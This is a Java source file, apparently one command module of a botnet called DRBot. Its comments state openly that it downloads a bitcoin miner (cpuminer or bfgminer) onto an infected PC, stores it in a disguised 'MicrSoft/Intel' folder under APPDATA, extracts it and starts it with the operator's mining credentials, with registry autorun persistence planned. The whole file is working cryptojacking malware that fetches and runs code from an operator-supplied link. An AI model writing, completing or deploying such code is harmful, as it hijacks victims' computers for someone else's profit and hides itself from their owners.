package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;
import java.io.IOException;

/**
 * @author MerNat
 * 
 * First of all, this code will download the cpuminer or other bitcoin miner available on 
 * the Internet. After that it will extract it using the >zip module and put an autorun or 
 * start it when self executes. either way you will benefit it mining from the infected pc.
 * 
 * 1. download the miner.
 * 2. recieve the address,user,password of bitcoin to mine.
 * 3. make a full registry with autorun that runs on background or self executor.
 * 4. check whether it runs on each virus startup.
 * 
 * 5. i recommend to have the sequence ....
 *                 >bmine [linkToDownloadMiner] [address] [user] [password] [codeMiner] [Retries]
 * 6. Code to Miners
 *                  1 > cpuMiner
 *                  2 > bfgMiner
 */

public class bmine implements Runnable{
    
    private final String[] command;
    private String[] fullCommand;
    private final String linkMiner;
    private final String address;
    private final String user;
    private final String password;
    private String minerName,minerName2;
    private final int minerCode,ret;
    private final PrintWriter writer;
    private final SecureLine secureLine;
    
    bmine(String[] command,PrintWriter writer,SecureLine secureLine){
        this.command = command;
        this.writer = writer;
        this.secureLine = secureLine;
        if(this.command.length == 7){
        fullCommand = new String[this.command.length-1];
        }
        else{
            toPrint("[bmine] Sequence Error.");
        }
        
        for(int i = 1;i<this.command.length;i++){
            fullCommand[i] = this.command[i-1];
        }
        linkMiner = fullCommand[0];
        address = fullCommand[1].replace(":","*");
        user = fullCommand[2];
        password = fullCommand[3];
        minerCode = Integer.parseInt(fullCommand[4]);
        ret = Integer.parseInt(fullCommand[5]);
        // there must be a module that handles the verification.
        // i updated the down module.
    }
    
    @Override
    public void run(){
        //first we have to download the B.Miner
        if(minerCode == 1){
            minerName = "cpu.zip";
            minerName2 = "cpu";
        }
        else
            if(minerCode == 2){
                minerName = "bfg.zip";
                minerName2 = "bfg";
            }
        String[] toEn = new String[]{">down",linkMiner,"/MicrSoft/Intel/" + minerName + "null"};
        Thread downloader = new Thread(new down(toEn,writer,secureLine));
        downloader.start();
        while(downloader.isAlive()){
            try {
                Thread.sleep(400000);
            } catch (InterruptedException ex) {}
        }
        // now we already downlaoded the miner so what we have to do right now is .... extract it.
        String roam = System.getenv("APPDATA").replace("\\","\\\\").replace("%20"," ") + "\\MicrSoft\\Intel\\";
        String roaming = roam + minerName;
        Thread zipEx = new Thread(new zip(new String[]{">zip",roaming,"null"},writer,secureLine));
        zipEx.start();
        
        while(zipEx.isAlive()){
            try {
                Thread.sleep(10000);
            } catch (InterruptedException ex) {}
        }
        // we finish extracting the miner .... next one is build the address, user and password of the miner
        miner miner = new miner(roam + minerName2 + "\\cpu\\",writer,minerCode,address,user,password,ret,secureLine);
    }
    
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
}
